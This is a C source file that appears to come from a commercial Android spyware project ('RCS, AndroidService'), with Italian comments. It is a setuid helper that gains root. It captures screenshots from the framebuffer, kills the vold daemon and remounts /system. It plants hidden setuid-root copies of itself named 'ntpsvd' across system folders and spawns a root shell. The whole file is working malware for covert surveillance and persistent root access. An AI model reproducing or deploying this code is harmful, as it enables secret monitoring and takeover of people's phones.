/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : suidext.c
 * Created      : Maj 20, 2011
 * Author		: zeno
 * *******************************************/

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/param.h>
#include <sys/time.h>
#include <linux/netlink.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <string.h>
#include <signal.h>
#include <stdlib.h>
#include <math.h>
#include <dlfcn.h>
#include <elf.h>
#include <sys/system_properties.h>
#include <errno.h>
#include <jni.h>
#include <android/log.h>
#include <dirent.h>
#include <linux/reboot.h>

#define LOG(x)  printf(x)

static int copy(const char *from, const char *to);
unsigned int getProcessId(const char *p_processname);
int setgod();
void sync_reboot();
int remount(const char *mntpoint, int flags);
static void copy_root(const char *mntpnt, const char *dst);

// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato

// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	int i;
	setgod();

	if (argc == 2) {
		// Cattura uno screenshot
		if (strcmp(argv[1], "fb") == 0) {
			char* filename = "/data/data/com.android.service/files/frame";

			copy("/dev/graphics/fb0", filename);
			chmod("/data/data/com.android.service/files/frame", 0666);
		} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
			unsigned int pid;
		
			LOG("Killing VOLD\n");

			for (i = 0; i < 2; i++) {
				pid = getProcessId("vold");

				if (pid) {
					kill(getProcessId("vold"), SIGKILL);
					sleep(2);
				}	
			}
		} else if (strcmp(argv[1], "reb") == 0) { // Reboot
			LOG("Rebooting...\n");

			sync_reboot();
		} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
			remount("/system", MS_RDONLY);
		} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
			remount("/system", 0);
		} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
			copy_root("/system", "/system/bin/ntpsvd");
			copy_root("/", "/ntpsvd");
			copy_root("/system", "/system/xbin/ntpsvd");
			copy_root("/system", "/system/customize/ntpsvd");
			copy_root("/system", "/system/app/ntpsvd");
			copy_root("/system", "/system/etc/ntpsvd");
			copy_root("/system", "/system/tts/ntpsvd");
		}
	} else {
		const char * shell = "/system/bin/sh";
		LOG("Starting shell\n");

		int i;
		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = "sh";

		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}

		execv("/system/bin/sh", exec_args);

		LOG("Exiting shell\n");
	}

	return 0;
}

static void copy_root(const char *mntpnt, const char *dst) {
	remount(mntpnt, 0);
	copy("/proc/self/exe", dst);
	chown(dst, 0, 0);
	chmod(dst, 04755);
	remount(mntpnt, MS_RDONLY);
}

static int copy(const char *from, const char *to) {
	int fd1, fd2;
	char buf[0x1000];
	int r = 0;

	if ((fd1 = open(from, O_RDONLY)) < 0) {
		return -1;
	}

	if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) < 0) {
		close(fd1);
		return -1;
	}

	for (;;) {
		r = read(fd1, buf, sizeof(buf));

		if (r <= 0)
			break;

		if (write(fd2, buf, r) != r)
			break;
	}

	close(fd1);
	close(fd2);

	sync();
	sync();

	return r;
}

unsigned int getProcessId(const char *p_processname) {
    DIR *dir_p;
    struct dirent *dir_entry_p;
    char dir_name[128];
    char target_name[252];
    int target_result;
    char exe_link[252];
    int errorcount;
    int result;
    char msg[256];

    errorcount = 0;
    result = 0;

    if (!setgod()) {
		return 0;
	}

    dir_p = opendir("/proc/");

    while (NULL != (dir_entry_p = readdir(dir_p))) {
        if (strspn(dir_entry_p->d_name, "0123456789") == strlen(dir_entry_p->d_name)) {
            strcpy(dir_name, "/proc/");
            strcat(dir_name, dir_entry_p->d_name);
            strcat(dir_name, "/");

            exe_link[0] = 0;
            strcat(exe_link, dir_name);
            strcat(exe_link, "exe");
            target_result = readlink(exe_link, target_name, sizeof(target_name) - 1);

            if (target_result > 0) {
                target_name[target_result] = 0;

                if (strstr(target_name, p_processname) != NULL) {
                    result = atoi(dir_entry_p->d_name);

                    sprintf(msg, "getProcessID(%s) id = %d\n", p_processname, result);
                    LOG(msg);

                    closedir(dir_p);
                    return result;
                }
            }
        }
    }

    closedir(dir_p);

    sprintf(msg, "getProcessID(%s) id = 0 (could not find process)\n", p_processname);
    LOG(msg);

    return result;
}

void sync_reboot() {
	char buf[256];

	setgod();
	sync();

	if (reboot(LINUX_REBOOT_CMD_RESTART) < 0) {
		sprintf(buf, "Error rebooting: %d\n", errno);
		LOG(buf);	
	}
}

int remount(const char *mntpoint, int flags) {
    FILE *f = NULL;
    int found = 0;
    char buf[1024], *dev = NULL, *fstype = NULL;

	if (!setgod()) {
		return -1;
	}

    if ((f = fopen("/proc/mounts", "r")) == NULL) {
        return -1;
    }

    memset(buf, 0, sizeof(buf));

    for (;!feof(f);) {
        if (fgets(buf, sizeof(buf), f) == NULL)
            break;

        if (strstr(buf, mntpoint)) {
            found = 1;
            break;
        }
    }

    fclose(f);

    if (!found) {
        return -1;
    }

    if ((dev = strtok(buf, " \t")) == NULL) {
        return -1;
    }

    if (strtok(NULL, " \t") == NULL) {
        return -1;
    }

    if ((fstype = strtok(NULL, " \t")) == NULL) {
        return -1;
    }

    return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
}

int setgod() {
    char buf[256];

    //sprintf(buf, "Actuald UID: %d, GID: %d, EUID: %d, EGID: %d\n", getuid(), getgid(), geteuid(), getegid());
    //LOG(buf);

    setegid(0);
    setuid(0);
    setgid(0);
    seteuid(0);

    sprintf(buf, "Actual UID: %d, GID: %d, EUID: %d, EGID: %d, err: %d\n", getuid(), getgid(), geteuid(), getegid(), errno);
    LOG(buf);

    return (seteuid(0) == 0) ? 1 : 0;
}
